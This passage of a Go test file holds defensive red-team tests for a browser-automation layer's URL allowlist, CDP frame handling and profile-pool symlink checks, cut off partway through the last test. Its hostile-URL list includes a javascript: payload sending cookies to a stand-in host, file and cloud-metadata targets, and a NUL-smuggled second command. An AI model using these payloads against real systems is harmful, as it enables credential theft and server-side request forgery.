//go:build unix

// Red-team attack tests for the J1 browser layer (J1 task T27), driven by a
// compact scripted CDP peer (no Chrome, every unix): hostile navigation
// targets and paused request URLs, detach and attach races on the
// in-browser allowlist, malformed and oversized CDP frames and events, CDP
// error texts carrying a canary, pre-planted symlinks in the pool base,
// the stale-profile sweep and the Windows port file / listener checks. A
// test passes when the attack is defeated. Everything is synthetic.
//
// This package lives in its own directory (internal/browser/attackunit)
// because the red-team may only write attack_test.go files: the
// real-Chrome attacks take internal/browser/attack_test.go (build tags
// e2e && chrome && linux) and the failing finding tests take
// internal/browser/attackfindings/attack_test.go.
package attackunit_test

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"log/slog"
	"net/netip"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/browser"
	"github.com/FlorianRuen/facto/internal/connector"
	"github.com/FlorianRuen/facto/internal/fsx"
	"github.com/FlorianRuen/facto/internal/httpx/cdploopback"
	"github.com/FlorianRuen/facto/internal/testsecrets"
)

// ------------------------------------------------------------ fake peer

const (
	ctxID     = "ctx-atk"
	targetID  = "tgt-atk"
	sessionID = "sess-atk"
	waitLimit = 20 * time.Second
)

var allow = []string{"supplier.example", "*.supplier.example"}

type call struct {
	Method  string
	Session string
	Params  map[string]any
}

// cdpError is a scripted CDP error answer.
type cdpError struct {
	code int64
	msg  string
}

// peer is a scripted CDP browser implementing browser.Transport.
type peer struct {
	t *testing.T

	mu       sync.Mutex
	calls    []call
	changed  chan struct{}
	override map[string]func(c call) any
	gate     map[string]chan struct{} // method+"@"+session -> answer held until closed

	out    chan []byte
	once   sync.Once
	closed chan struct{}
}

func newPeer(t *testing.T) *peer {
	t.Helper()
	return &peer{
		t: t, changed: make(chan struct{}), override: map[string]func(call) any{},
		gate: map[string]chan struct{}{}, out: make(chan []byte, 4096), closed: make(chan struct{}),
	}
}

func (p *peer) Send(msg []byte) error {
	var req struct {
		ID        int64          `json:"id"`
		Method    string         `json:"method"`
		SessionID string         `json:"sessionId"`
		Params    map[string]any `json:"params"`
	}
	if err := json.Unmarshal(msg, &req); err != nil {
		return fmt.Errorf("%w: peer", browser.ErrBadFrame)
	}
	c := call{Method: req.Method, Session: req.SessionID, Params: req.Params}
	if c.Params == nil {
		c.Params = map[string]any{}
	}
	p.mu.Lock()
	p.calls = append(p.calls, c)
	close(p.changed)
	p.changed = make(chan struct{})
	ov := p.override[c.Method]
	g := p.gate[c.Method+"@"+c.Session]
	p.mu.Unlock()
	if g != nil {
		select {
		case <-g:
		case <-p.closed:
			return fmt.Errorf("%w: peer closed", browser.ErrBrowserGone)
		}
	}
	var result any
	if ov != nil {
		result = ov(c)
	}
	if result == nil {
		result = p.model(c)
	}
	resp := map[string]any{"id": req.ID}
	if req.SessionID != "" {
		resp["sessionId"] = req.SessionID
	}
	if e, ok := result.(*cdpError); ok {
		resp["error"] = map[string]any{"code": e.code, "message": e.msg}
	} else {
		resp["result"] = result
	}
	b, err := json.Marshal(resp)
	if err != nil {
		return fmt.Errorf("peer marshal: %w", err)
	}
	p.push(b)
	return nil
}

func (p *peer) model(c call) any {
	switch c.Method {
	case "Target.createBrowserContext":
		return map[string]any{"browserContextId": ctxID}
	case "Target.createTarget":
		return map[string]any{"targetId": targetID}
	case "Target.attachToTarget":
		return map[string]any{"sessionId": sessionID}
	case "Page.navigate":
		return map[string]any{"frameId": "frame-main", "loaderId": "loader-1"}
	default:
		return map[string]any{}
	}
}

func (p *peer) Recv() ([]byte, error) {
	select {
	case b := <-p.out:
		return b, nil
	case <-p.closed:
		return nil, fmt.Errorf("%w: peer closed", browser.ErrBrowserGone)
	}
}

func (p *peer) Close() error {
	p.once.Do(func() { close(p.closed) })
	return nil
}

func (p *peer) push(b []byte) {
	select {
	case p.out <- b:
	case <-p.closed:
	}
}

func (p *peer) emit(session, method string, params any) {
	p.t.Helper()
	ev := map[string]any{"method": method, "params": params}
	if session != "" {
		ev["sessionId"] = session
	}
	b, err := json.Marshal(ev)
	if err != nil {
		p.t.Fatal(err)
	}
	p.push(b)
}

func (p *peer) setOverride(method string, fn func(c call) any) {
	p.mu.Lock()
	p.override[method] = fn
	p.mu.Unlock()
}

// hold makes the answer to method on session wait until the returned
// function is called.
func (p *peer) hold(method, session string) (release func()) {
	ch := make(chan struct{})
	p.mu.Lock()
	p.gate[method+"@"+session] = ch
	p.mu.Unlock()
	var once sync.Once
	return func() { once.Do(func() { close(ch) }) }
}

func (p *peer) snapshot() []call {
	p.mu.Lock()
	defer p.mu.Unlock()
	return slices.Clone(p.calls)
}

func (p *peer) waitCalls(t *testing.T, match func(c call) bool) {
	const n = 1
	t.Helper()
	timer := time.NewTimer(waitLimit)
	defer timer.Stop()
	for {
		p.mu.Lock()
		var got []call
		for _, c := range p.calls {
			if match(c) {
				got = append(got, c)
			}
		}
		ch := p.changed
		p.mu.Unlock()
		if len(got) >= n {
			return
		}
		select {
		case <-ch:
		case <-timer.C:
			t.Fatalf("peer: waited for %d matching calls, got %d", n, len(got))
			return
		}
	}
}

func is(method, session, requestID string) func(c call) bool {
	return func(c call) bool {
		return c.Method == method && c.Session == session && (requestID == "" || c.Params["requestId"] == requestID)
	}
}

func count(calls []call, match func(c call) bool) int {
	n := 0
	for _, c := range calls {
		if match(c) {
			n++
		}
	}
	return n
}

func (p *peer) attach(parent, child, tgt, typ string, waiting bool) {
	p.t.Helper()
	p.emit(parent, "Target.attachedToTarget", map[string]any{
		"sessionId": child, "waitingForDebugger": waiting,
		"targetInfo": map[string]any{"targetId": tgt, "type": typ, "url": "", "attached": true, "browserContextId": ctxID},
	})
}

func (p *peer) paused(session, id, rawURL string) {
	p.t.Helper()
	p.emit(session, "Fetch.requestPaused", map[string]any{
		"requestId": id, "frameId": "frame-main", "resourceType": "XHR", "networkId": "n-" + id,
		"request": map[string]any{"url": rawURL, "method": "GET", "headers": map[string]any{}},
	})
}

// blockedNotContinued waits for the failRequest of id on session, then
// proves (with an allowed sentinel request answered after it) that it was
// never continued.
func (p *peer) blockedNotContinued(t *testing.T, session, id string) {
	t.Helper()
	p.waitCalls(t, is("Fetch.failRequest", session, id))
	sentinel := "sentinel-" + id
	p.paused(session, sentinel, "https://login.supplier.example/ok")
	p.waitCalls(t, is("Fetch.continueRequest", session, sentinel))
	if n := count(p.snapshot(), is("Fetch.continueRequest", session, id)); n != 0 {
		t.Errorf("request %s continued %d times, want it failed only", id, n)
	}
}

type syncBuf struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuf) Write(b []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(b) //nolint:wrapcheck // test sink
}

func (s *syncBuf) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

type rig struct {
	p    *peer
	c    *browser.Client
	page *browser.Page
	logs *syncBuf
}

func ctx(t *testing.T) context.Context {
	t.Helper()
	c, cancel := context.WithTimeout(t.Context(), waitLimit)
	t.Cleanup(cancel)
	return c
}

func newRig(t *testing.T) *rig {
	t.Helper()
	p := newPeer(t)
	c := browser.NewClient(p)
	t.Cleanup(func() { _ = c.Close() })
	logs := &syncBuf{}
	pg, err := browser.NewPage(ctx(t), c, browser.PageOptions{
		AllowedDomains: allow,
		Log:            slog.New(slog.NewTextHandler(logs, &slog.HandlerOptions{Level: slog.LevelDebug})),
		PollWait:       func(ctx context.Context) error { return ctx.Err() },
	})
	if err != nil {
		t.Fatalf("NewPage: %v", err)
	}
	t.Cleanup(func() { _ = pg.Close() })
	return &rig{p: p, c: c, page: pg, logs: logs}
}

// ------------------------------------------------------------ hostile URLs

// hostileURLs are navigation targets and request URLs a supplier page (or a
// compromised connector) may produce. None is an https URL on port 443 of
// an allowlisted host name. %s is a canary placed where a token would sit.
var hostileURLs = []string{
	"file:///etc/passwd",
	"file://login.supplier.example/etc/passwd",
	"chrome://settings/passwords",
	"chrome://inspect/#devices",
	"chrome-extension://abcdefghijklmnop/x.html",
	"devtools://devtools/bundled/inspector.html",
	"view-source:https://login.supplier.example/",
	"javascript:fetch('https://evil.test/?c='+document.cookie)",
	"data:text/html,<script>alert(1)</script>",
	"blob:https://login.supplier.example/0b2c1f7e-6c1a-4b8e-9d1e-6e1f0a7c2b3d",
	"filesystem:https://login.supplier.example/temporary/x",
	"about:blank",
	"about:srcdoc",
	"http://login.supplier.example/login",
	"ws://login.supplier.example/socket",
	"wss://evil.test/socket",
	"ftp://login.supplier.example/x",
	"https://evil.test/collect?tok=%s",
	"https://login.supplier.example.evil.test/",
	"https://supplier.example.evil.test/",
	"https://evilsupplier.example/",
	"https://login.supplier.example@evil.test/",
	"https://user:%s@login.supplier.example/",
	"https://evil.test#@login.supplier.example/",
	"https://evil.test\\@login.supplier.example/",
	"https://evil.test\\.supplier.example/",
	"https://login.supplier.example:8443/",
	"https://login.supplier.example:80/",
	"https://login.supplier.example:0443/",
	// "https://login.supplier.example:/" (empty port) is accepted by
	// Navigate: Chrome reads it as port 443 of an allowlisted host, so it
	// is not an escape (httpx refuses it; requestAllowed too, below).
	"https://login.supplier.example:443@evil.test/",
	"https://login.supplier.example%2eevil.test/",
	"https://login%2esupplier.example/",
	"https://login.supplier.example./",
	"https://login.supplier.example\t/",
	"https://login.supplier.example /",
	"https://login.supplier.example\x00.evil.test/",
	"https://xn--login-supplier-example.test/",
	"https://\u24dbogin.supplier.example/",
	"https://login.supplier.ex\u0430mple/", // Cyrillic a (U+0430)
	"https://127.0.0.1/",
	"https://127.0.0.1:443/",
	"https://127.1/",
	"https://2130706433/",
	"https://0x7f000001/",
	"https://0177.0.0.1/",
	"https://[::1]/",
	"https://[::ffff:127.0.0.1]/",
	"https://[fe80::1%25eth0]/",
	"https://169.254.169.254/latest/meta-data/",
	"https://10.0.0.1/",
	"https://localhost/",
	"https:login.supplier.example/",
	"https:/login.supplier.example/",
	"//login.supplier.example/",
	"/relative/path",
	"",
}

func hostile(canary string) []string {
	out := make([]string, len(hostileURLs))
	for i, u := range hostileURLs {
		if strings.Contains(u, "%s") {
			u = fmt.Sprintf(u, canary)
		}
		out[i] = u
	}
	return out
}

// TestAttack_NavigateRefusesHostileSchemesHostsAndIPLiterals: Navigate
// refuses every hostile target before any CDP call, and its error and logs
// never quote the URL.
func TestAttack_NavigateRefusesHostileSchemesHostsAndIPLiterals(t *testing.T) {
	t.Parallel()
	tok := testsecrets.Canary(t, testsecrets.Token)
	for i, u := range hostile(tok) {
		t.Run(strconv.Itoa(i), func(t *testing.T) {
			t.Parallel()
			r := newRig(t)
			err := r.page.Navigate(ctx(t), u)
			if !errors.Is(err, browser.ErrURLRefused) {
				t.Fatalf("Navigate(%q) = %v, want ErrURLRefused", u, err)
			}
			if n := count(r.p.snapshot(), func(c call) bool { return c.Method == "Page.navigate" }); n != 0 {
				t.Errorf("Navigate(%q) sent %d Page.navigate", u, n)
			}
			if strings.Contains(err.Error(), tok) || (len(u) > 12 && strings.Contains(err.Error(), u)) {
				t.Errorf("error quotes the URL: %q", err)
			}
			if strings.Contains(r.logs.String(), tok) {
				t.Error("page log holds the token canary")
			}
		})
	}
	// Control: the matcher is not refusing everything.
	r := newRig(t)
	for _, ok := range []string{"https://login.supplier.example/login", "https://LOGIN.Supplier.Example:443/x", "https://supplier.example/"} {
		if err := r.page.Navigate(ctx(t), ok); err != nil {
			t.Errorf("Navigate(%q) = %v, want allowed (control)", ok, err)
		}
	}
}

// TestAttack_PausedRequestHostileURLsFailClosed: a request to any hostile
// URL, paused by Fetch on the page session, is failed (never continued),
// and the page logs hold neither its path nor its query.
func TestAttack_PausedRequestHostileURLsFailClosed(t *testing.T) {
	t.Parallel()
	tok := testsecrets.Canary(t, testsecrets.Token)
	r := newRig(t)
	urls := append(hostile(tok), "https://login.supplier.example:/")
	for i, u := range urls {
		r.p.paused(sessionID, "h-"+strconv.Itoa(i), u)
	}
	for i := range urls {
		r.p.blockedNotContinued(t, sessionID, "h-"+strconv.Itoa(i))
	}
	if strings.Contains(r.logs.String(), tok) {
		t.Error("page log holds the query canary of a blocked request")
	}
	for h := range r.page.BlockedHosts() {
		if strings.Contains(h, tok) || strings.ContainsAny(h, "/?#@\\ \t\x00") {
			t.Errorf("BlockedHosts key %q holds more than a host name", h)
		}
	}
}

// ------------------------------------------------------------ detach / attach races

// TestAttack_DetachNamingPageSessionKeepsEnforcement (T9 review): a
// Target.detachedFromTarget naming the page session, on the page session or
// on the browser session, leaves the page's Fetch interception and
// auto-attach handling in place.
func TestAttack_DetachNamingPageSessionKeepsEnforcement(t *testing.T) {
	t.Parallel()
	for _, on := range []string{"", sessionID} {
		t.Run("detach on session "+strconv.Quote(on), func(t *testing.T) {
			t.Parallel()
			r := newRig(t)
			r.p.emit(on, "Target.detachedFromTarget", map[string]any{"sessionId": sessionID, "targetId": targetID})
			r.p.emit(on, "Target.detachedFromTarget", map[string]any{"sessionId": "", "targetId": targetID})
			// The page still fails an off-allowlist request...
			r.p.paused(sessionID, "after-detach", "https://evil.test/x")
			r.p.blockedNotContinued(t, sessionID, "after-detach")
			// ...and still enforces on a new child before resuming it.
			r.p.attach(sessionID, "sess-child", "tgt-child", "iframe", true)
			r.p.waitCalls(t, is("Runtime.runIfWaitingForDebugger", "sess-child", ""))
			calls := r.p.snapshot()
			iFetch := slices.IndexFunc(calls, func(c call) bool { return c.Method == "Fetch.enable" && c.Session == "sess-child" })
			iRun := slices.IndexFunc(calls, func(c call) bool {
				return c.Method == "Runtime.runIfWaitingForDebugger" && c.Session == "sess-child"
			})
			if iFetch < 0 || iFetch > iRun {
				t.Errorf("child resumed without Fetch first after a detach naming the page session")
			}
		})
	}
}

// TestAttack_ChildAttachingOnDetachedParentClosedNeverResumed (T9 review):
// an attach event queued on a frame session that is detached before the
// event is handled is closed through Target.closeTarget on the browser
// session and never resumed.
func TestAttack_ChildAttachingOnDetachedParentClosedNeverResumed(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	const frame, w1, w2 = "sess-frame", "sess-w1", "sess-w2"
	r.p.attach(sessionID, frame, "tgt-frame", "iframe", true)
	r.p.waitCalls(t, is("Runtime.runIfWaitingForDebugger", frame, ""))

	// Keep the frame's handler busy on w1 while w2 is queued behind it and
	// the frame is detached.
	release := r.p.hold("Fetch.enable", w1)
	defer release()
	r.p.attach(frame, w1, "tgt-w1", "worker", true)
	r.p.waitCalls(t, is("Fetch.enable", w1, ""))
	r.p.attach(frame, w2, "tgt-w2", "worker", true)
	r.p.emit(sessionID, "Target.detachedFromTarget", map[string]any{"sessionId": frame, "targetId": "tgt-frame"})
	// The detach is handled on the page session's own queue: once a later
	// event on that queue is handled, the frame is released.
	r.p.paused(sessionID, "barrier", "https://login.supplier.example/ok")
	r.p.waitCalls(t, is("Fetch.continueRequest", sessionID, "barrier"))
	release()

	r.p.waitCalls(t, func(c call) bool {
		return c.Method == "Target.closeTarget" && c.Params["targetId"] == "tgt-w2"
	})
	for _, c := range r.p.snapshot() {
		if c.Method == "Target.closeTarget" && c.Params["targetId"] == "tgt-w2" && c.Session != "" {
			t.Errorf("closeTarget sent on session %q, want the browser session", c.Session)
		}
		if c.Session == w2 && c.Method == "Runtime.runIfWaitingForDebugger" {
			t.Error("child of a detached parent resumed")
		}
	}
}

// TestAttack_MalformedTargetAndPauseEventsFailClosed: attach events and
// paused requests of the wrong shape never resume a target nor continue a
// request; an attach of an already running target in the login context
// closes it.
func TestAttack_MalformedTargetAndPauseEventsFailClosed(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	bad := []map[string]any{
		{"sessionId": 42, "waitingForDebugger": true, "targetInfo": map[string]any{"targetId": "t1", "type": "iframe"}},
		{"sessionId": "s-bad-2", "waitingForDebugger": "true", "targetInfo": map[string]any{"targetId": "t2", "type": "iframe"}},
		{"sessionId": "s-bad-3", "waitingForDebugger": true, "targetInfo": "iframe"},
		{"sessionId": "", "waitingForDebugger": true, "targetInfo": map[string]any{"targetId": "t4", "type": "iframe"}},
		{"sessionId": "s-bad-5", "waitingForDebugger": true, "targetInfo": map[string]any{"targetId": 5, "type": "iframe"}},
	}
	for _, b := range bad {
		r.p.emit(sessionID, "Target.attachedToTarget", b)
	}
	// Already running (not waiting): closed, never resumed.
	r.p.attach(sessionID, "s-running", "t-running", "iframe", false)
	r.p.waitCalls(t, func(c call) bool { return c.Method == "Target.closeTarget" && c.Params["targetId"] == "t-running" })

	r.p.emit(sessionID, "Fetch.requestPaused", map[string]any{"requestId": "p1", "request": map[string]any{"url": 12}})
	r.p.emit(sessionID, "Fetch.requestPaused", map[string]any{"requestId": "p2", "request": "https://login.supplier.example/"})
	r.p.emit(sessionID, "Fetch.requestPaused", map[string]any{"requestId": "p3"})
	r.p.emit(sessionID, "Fetch.requestPaused", map[string]any{"requestId": "p4", "request": map[string]any{"url": []string{"https://login.supplier.example/"}}})
	for _, id := range []string{"p1", "p2", "p3", "p4"} {
		r.p.blockedNotContinued(t, sessionID, id)
	}
	// A pause with no request id cannot be answered: it stays paused.
	r.p.emit(sessionID, "Fetch.requestPaused", map[string]any{"requestId": "", "request": map[string]any{"url": "https://login.supplier.example/"}})
	r.p.paused(sessionID, "final", "https://login.supplier.example/ok")
	r.p.waitCalls(t, is("Fetch.continueRequest", sessionID, "final"))
	for _, c := range r.p.snapshot() {
		if c.Method == "Runtime.runIfWaitingForDebugger" && c.Session != "" && c.Session != sessionID {
			t.Errorf("malformed or running target resumed on session %q", c.Session)
		}
		if c.Method == "Fetch.continueRequest" && (c.Params["requestId"] == "" || c.Params["requestId"] == nil) {
			t.Error("continueRequest sent for a pause without request id")
		}
	}
}

// TestAttack_PauseFloodKillsClientNeverContinues: more paused requests at
// once than the fail-closed queue holds kill the client; none of the
// off-allowlist requests is continued.
func TestAttack_PauseFloodKillsClientNeverContinues(t *testing.T) {
	t.Parallel()
	r := newRig(t)
	// Hold the page handler on the first pause so the queue fills up.
	release := r.p.hold("Fetch.failRequest", sessionID)
	defer release()
	for i := range browser.DefaultEventBuffer + 64 {
		r.p.paused(sessionID, "flood-"+strconv.Itoa(i), "https://evil.test/"+strconv.Itoa(i))
	}
	cctx := ctx(t)
	var err error
	for err == nil {
		_, err = r.c.Call(cctx, "", "Browser.getVersion", nil)
	}
	if !errors.Is(err, browser.ErrEventOverflow) {
		t.Fatalf("after a pause flood Call = %v, want ErrEventOverflow (client dead)", err)
	}
	release()
	if n := count(r.p.snapshot(), func(c call) bool { return c.Method == "Fetch.continueRequest" }); n != 0 {
		t.Errorf("%d off-allowlist requests continued during the flood", n)
	}
}

// ------------------------------------------------------------ frames

// scripted is a Transport replaying frames to the client.
type scripted struct {
	frames chan []byte
	once   sync.Once
	done   chan struct{}
}

func newScripted(frames ...[]byte) *scripted {
	s := &scripted{frames: make(chan []byte, len(frames)), done: make(chan struct{})}
	for _, f := range frames {
		s.frames <- f
	}
	return s
}

func (s *scripted) Send([]byte) error { return nil }

func (s *scripted) Recv() ([]byte, error) {
	select {
	case f := <-s.frames:
		return f, nil
	case <-s.done:
		return nil, fmt.Errorf("%w: closed", browser.ErrBrowserGone)
	}
}

func (s *scripted) Close() error {
	s.once.Do(func() { close(s.done) })
	return nil
}

// TestAttack_MalformedCDPFramesKillTheClient: frames that are not CDP
// messages kill the client with ErrBadFrame, and the error never quotes the
// frame.
func TestAttack_MalformedCDPFramesKillTheClient(t *testing.T) {
	t.Parallel()
	tok := testsecrets.Canary(t, testsecrets.Cookie)
	deep := strings.Repeat("[", 20000) + strings.Repeat("]", 20000)
	frames := map[string]string{
		"not json":           "cookie=" + tok,
		"id as string":       `{"id":"1","result":{"v":"` + tok + `"}}`,
		"session as number":  `{"id":1,"sessionId":7,"result":{}}`,
		"method as object":   `{"method":{"x":"` + tok + `"},"params":{}}`,
		"truncated":          `{"id":1,"result":{"v":"` + tok,
		"deeply nested":      `{"method":"Fetch.requestPaused","params":` + deep + `}`,
		"error code as text": `{"id":1,"error":{"code":"` + tok + `","message":"x"}}`,
		"bare string":        `"` + tok + `"`,
		"invalid utf8 key":   "{\"\xff\xfe\":1}",
	}
	for name, f := range frames {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			// A trailing garbage frame ends the case when f itself is
			// valid JSON (dropped as an event nobody subscribed to).
			c := browser.NewClient(newScripted([]byte(f), []byte("x")))
			defer func() { _ = c.Close() }()
			cctx, cancel := context.WithTimeout(t.Context(), waitLimit)
			defer cancel()
			var err error
			for err == nil {
				_, err = c.Call(cctx, "", "Browser.getVersion", nil)
			}
			if !errors.Is(err, browser.ErrBadFrame) {
				t.Fatalf("Call after %s = %v, want ErrBadFrame", name, err)
			}
			if strings.Contains(err.Error(), tok) {
				t.Errorf("error quotes the frame: %q", err)
			}
		})
	}
}

// TestAttack_CDPErrorTextNeverQuoted: a CDP error answer whose message holds
// a cookie and a password canary reaches the caller as its code only.
func TestAttack_CDPErrorTextNeverQuoted(t *testing.T) {
	t.Parallel()
	ck := testsecrets.Canary(t, testsecrets.Cookie)
	pw := testsecrets.Canary(t, testsecrets.Password)
	p := newPeer(t)
	msg := "Set-Cookie: sid=" + ck + "; password=" + pw + "\x1b[2J"
	for _, m := range []string{"Target.createBrowserContext", "Page.navigate", "Storage.getCookies", "Fetch.enable"} {
		p.setOverride(m, func(call) any { return &cdpError{code: -32000, msg: msg} })
	}
	c := browser.NewClient(p)
	defer func() { _ = c.Close() }()
	logs := &syncBuf{}
	_, err := browser.NewPage(ctx(t), c, browser.PageOptions{
		AllowedDomains: allow, Log: slog.New(slog.NewTextHandler(logs, &slog.HandlerOptions{Level: slog.LevelDebug})),
	})
	if err == nil {
		t.Fatal("NewPage succeeded although every call fails")
	}
	_, callErr := c.Call(ctx(t), sessionID, "Page.navigate", map[string]any{"url": "about:blank"})
	for _, e := range []error{err, callErr} {
		if !errors.Is(e, browser.ErrCDP) {
			t.Errorf("error %v, want ErrCDP", e)
		}
		if s := e.Error(); strings.Contains(s, ck) || strings.Contains(s, pw) || strings.Contains(s, "\x1b") {
			t.Errorf("CDP error text quoted: %q", s)
		}
	}
	if s := logs.String(); strings.Contains(s, ck) || strings.Contains(s, pw) {
		t.Error("page log holds the CDP error text")
	}
}

// TestAttack_OversizedPipeMessageRefused: a frame one byte over the cap, and
// a never-ending frame without delimiter, are refused while reading, with no
// payload in the error.
func TestAttack_OversizedPipeMessageRefused(t *testing.T) {
	t.Parallel()
	tok := testsecrets.Canary(t, testsecrets.Cookie)
	for _, tt := range []struct {
		name  string
		frame func(w io.Writer) error
	}{
		{name: "one byte over the cap", frame: func(w io.Writer) error {
			body := `{"method":"x","params":{"v":"` + tok + `","pad":"`
			pad := browser.MaxMessageBytes + 1 - len(body) - 3
			_, err := io.WriteString(w, body+strings.Repeat("A", pad)+`"}}`+"\x00")
			return err
		}},
		{name: "endless frame", frame: func(w io.Writer) error {
			chunk := bytes.Repeat([]byte(tok), 4096)
			for {
				if _, err := w.Write(chunk); err != nil {
					return err
				}
			}
		}},
	} {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			pr, pw := io.Pipe()
			tr := browser.NewPipeTransport(pr, io.Discard)
			go func() { _ = pw.CloseWithError(tt.frame(pw)) }()
			_, err := tr.Recv()
			_ = pr.Close()
			if !errors.Is(err, browser.ErrMessageTooLarge) {
				t.Fatalf("Recv = %v, want ErrMessageTooLarge", err)
			}
			if strings.Contains(err.Error(), tok) {
				t.Errorf("error quotes the frame: %q", err)
			}
			if _, err := tr.Recv(); !errors.Is(err, browser.ErrMessageTooLarge) {
				t.Errorf("second Recv = %v, want the sticky ErrMessageTooLarge", err)
			}
		})
	}
	// An outgoing NUL would split the frame into two commands.
	tr := browser.NewPipeTransport(bytes.NewReader(nil), io.Discard)
	if err := tr.Send([]byte(`{"id":1,"method":"Input.insertText","params":{"text":"a` + "\x00" + `{\"id\":2,\"method\":\"Browser.close\"}"}}`)); !errors.Is(err, browser.ErrBadFrame) {
		t.Errorf("Send with a raw NUL = %v, want ErrBadFrame", err)
	}
}

// ------------------------------------------------------------ pool

type fakeProc struct {
	c    *browser.Client
	done chan struct{}
	once sync.Once
}

func (f *fakeProc) Client() *browser.Client { return f.c }
func (f *fakeProc) Pid() int                { return os.Getpid() }
func (f *fakeProc) Done() <-chan struct{}   { return f.done }
func (f *fakeProc) Close() error {
	f.once.Do(func() { _ = f.c.Close(); close(f.done) })
	return nil
}

type poolRig struct {
	root, home, state, xdg string
	exe                    string
	mu                     sync.Mutex
	cmds                   []browser.Command
}

func mkPrivate(t *testing.T, parent, name string) string {
	t.Helper()
	r, err := fsx.Open(parent)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = r.Close() }()
	if err := r.MkdirPrivate(name); err != nil {
		t.Fatal(err)
	}
	return filepath.Join(parent, name)
}

func writeFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	r, err := fsx.Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = r.Close() }()
	if err := r.WriteAtomic(t.Context(), name, []byte(content)); err != nil {
		t.Fatal(err)
	}
	return filepath.Join(dir, name)
}

func newPoolRig(t *testing.T) *poolRig {
	t.Helper()
	root := t.TempDir()
	r := &poolRig{root: root}
	r.home = mkPrivate(t, root, "home")
	r.state = mkPrivate(t, root, "state")
	r.xdg = mkPrivate(t, root, "run")
	bin := mkPrivate(t, root, "bin")
	fr, err := fsx.Open(bin)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = fr.Close() }()
	if err := fr.WriteAtomicExec(t.Context(), "chrome", strings.NewReader("#!/bin/sh\nexit 0\n")); err != nil {
		t.Fatal(err)
	}
	r.exe = filepath.Join(bin, "chrome")
	return r
}

func (r *poolRig) config(t *testing.T, alive func(int) bool) browser.PoolConfig {
	t.Helper()
	env := map[string]string{"HOME": r.home, "PATH": "/usr/bin:/bin"}
	if r.xdg != "" {
		env["XDG_RUNTIME_DIR"] = r.xdg
	}
	euid := os.Geteuid()
	return browser.PoolConfig{
		Host: browser.Host{
			Executable: r.exe,
			Geteuid:    func() int { return euid },
			Owner:      func(string) (int, error) { return euid, nil },
			LookupEnv: func(k string) (string, bool) {
				v, ok := env[k]
				return v, ok
			},
			Log: slog.New(slog.DiscardHandler),
		},
		StateDir: r.state,
		PidAlive: alive,
		Start: func(_ context.Context, cmd browser.Command) (browser.Process, error) {
			r.mu.Lock()
			r.cmds = append(r.cmds, cmd)
			r.mu.Unlock()
			return &fakeProc{c: browser.NewClient(newPeer(t)), done: make(chan struct{})}, nil
		},
	}
}

func envValue(env []string, key string) string {
	for _, kv := range env {
		if v, ok := strings.CutPrefix(kv, key+"="); ok {
			return v
		}
	}
	return ""
}

// outside is a private directory next to the pool holding one file, with
// an inode snapshot to prove it was neither followed nor touched.
type outside struct {
	dir, file string
}

func newOutside(t *testing.T, r *poolRig, name string) outside {
	t.Helper()
	d := mkPrivate(t, r.root, name)
	return outside{dir: d, file: writeFile(t, d, "keep", "must survive "+name)}
}

func (o outside) assertIntact(t *testing.T) {
	t.Helper()
	ents, err := os.ReadDir(o.dir)
	if err != nil {
		t.Fatalf("outside dir %s: %v", o.dir, err)
	}
	if len(ents) != 1 || ents[0].Name() != "keep" {
		var names []string
		for _, e := range ents {
			names = append(names, e.Name())
		}
		t.Errorf("outside dir %s holds %q, want only keep", o.dir, names)
	}
	b, err := os.ReadFile(o.file)
	if err != nil || !strings.HasPrefix(string(b), "must survive") {
		t.Errorf("outside file %s = %q, %v; want untouched", o.file, b, err)
	}
	fi, err := os.Stat(o.dir)
	if err == nil && fi.Mode().Perm() != 0o700 {
		t.Errorf("outside dir mode changed to %v", fi.Mode().Perm())
	}
}

// TestAttack_PoolPrePlantedSymlinkBaseRefused: a pool base pre-planted as a
// symlink (to a private directory of the same user) is refused, never
// followed nor chmodded, with and without XDG_RUNTIME_DIR.
func TestAttack_PoolPrePlantedSymlinkBaseRefused(t *testing.T) {
	t.Parallel()
	for _, xdg := range []bool{true, false} {
		t.Run(fmt.Sprintf("xdg=%v", xdg), func(t *testing.T) {
			t.Parallel()
			r := newPoolRig(t)
			out := newOutside(t, r, "target")
			link := filepath.Join(r.state, "tmp")
			if xdg {
				link = filepath.Join(r.xdg, "facto")
			} else {
				r.xdg = ""
			}
			if err := os.Symlink(out.dir, link); err != nil {
				t.Fatal(err)
			}
			p, err := browser.NewPool(t.Context(), r.config(t, func(int) bool { return false }))
			if err == nil {
				_ = p.Close()
				t.Fatalf("NewPool accepted a symlinked base %s", link)
			}
			if !errors.Is(err, browser.ErrUnsafeProfileDir) {
				t.Errorf("NewPool = %v, want ErrUnsafeProfileDir", err)
			}
			out.assertIntact(t)
		})
	}
	t.Run("XDG_RUNTIME_DIR itself a symlink", func(t *testing.T) {
		t.Parallel()
		r := newPoolRig(t)
		out := newOutside(t, r, "target")
		link := filepath.Join(r.root, "runlink")
		if err := os.Symlink(out.dir, link); err != nil {
			t.Fatal(err)
		}
		r.xdg = link
		if p, err := browser.NewPool(t.Context(), r.config(t, func(int) bool { return false })); err == nil {
			_ = p.Close()
			t.Fatal("NewPool accepted a symlinked XDG_RUNTIME_DIR")
		}
		out.assertIntact(t)
	})
}

// TestAttack_PoolPrePlantedAreaAndProfileNamesNeverFollowed: the next
// t<pid>.<n> area names and profile-looking names pre-planted in the base
// as symlinks into another directory are skipped, never followed: the
// launch gets a fresh real area and profile, nothing is written through
// the links, and they survive the launch and its teardown.
func TestAttack_PoolPrePlantedAreaAndProfileNamesNeverFollowed(t *testing.T) {
	t.Parallel()
	r := newPoolRig(t)
	out := newOutside(t, r, "target")
	base := mkPrivate(t, r.xdg, "facto")
	pid := strconv.Itoa(os.Getpid())
	var links []string
